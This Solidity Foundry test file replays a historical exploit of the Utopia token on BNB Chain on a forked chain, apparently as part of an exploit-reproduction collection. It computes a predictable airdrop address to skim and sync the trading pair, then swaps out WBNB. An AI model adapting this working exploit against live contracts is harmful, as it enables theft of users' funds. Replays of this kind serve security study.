// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$119K
// Attacker : https://bscscan.com/address/0xe84ef3615b8df94c52e5b6ef21acbf0039b29113
// Attacker Contract : https://bscscan.com/address/0x6191203510c2a6442faecdb6c7bb837a76f02d23
// Vulnerable Contract : https://bscscan.com/address/0xb1da08c472567eb0ec19639b1822f578d39f3333
// Attack Tx : https://bscscan.com/tx/0xeb4eb487f58d39c05778fed30cd001b986d3c52279e44f46b2de2773e7ee1d5e

// @Analysis
// https://twitter.com/DeDotFiSecurity/status/1681923729645871104
// https://twitter.com/bulu4477/status/1682380542564769793

// Similar incident (FFIST) : https://github.com/SunWeb3Sec/DeFiHackLabs#20230720-ffist---business-logic-flaw

interface IUtopia is IERC20 {
    function lastAirdropAddress() external view returns (address);
}

contract UtopiaTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUtopia Utopia = IUtopia(0xb1da08C472567eb0EC19639b1822F578d39F3333);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 30_119_396);
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(Utopia), "Utopia");
        cheats.label(address(Router), "Router");
        cheats.label(address(Pair), "Pair");
    }

    function testExploit() public {
        deal(address(WBNB), address(this), 0.01 ether);
        WBNB.approve(address(Router), type(uint256).max);
        Utopia.approve(address(Router), type(uint256).max);
        emit log_named_decimal_uint(
            "Attacker WBNB balance before exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
        );

        WBNBToUtopia();
        Utopia.transfer(address(Pair), 1);

        // Setting balance of the pair to 1 by calculating the receiver's address
        // Two addresses (from, to) in seed calculation must be the same
        uint256 seed = (uint160(Utopia.lastAirdropAddress()) | uint160(block.number)) ^ uint160(address(Pair))
            ^ uint160(address(Pair));
        // tAmount may be 0 or 1
        address notRandomAirdropAddr = address(uint160(seed | 1));

        Pair.skim(notRandomAirdropAddr);
        Pair.sync();
        Utopia.transfer(address(Pair), 1);
        Pair.sync();
        UtopiaToWBNB();

        emit log_named_decimal_uint(
            "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {}

    function WBNBToUtopia() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(Utopia);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
    }

    function UtopiaToWBNB() internal {
        (uint256 reserveUtopia, uint256 reserveWBNB,) = Pair.getReserves();
        uint256 amountOut = Router.getAmountOut(32, reserveUtopia, reserveWBNB);
        Utopia.transfer(address(Pair), 32);
        Pair.swap(0, amountOut, address(this), new bytes(1));
    }
}
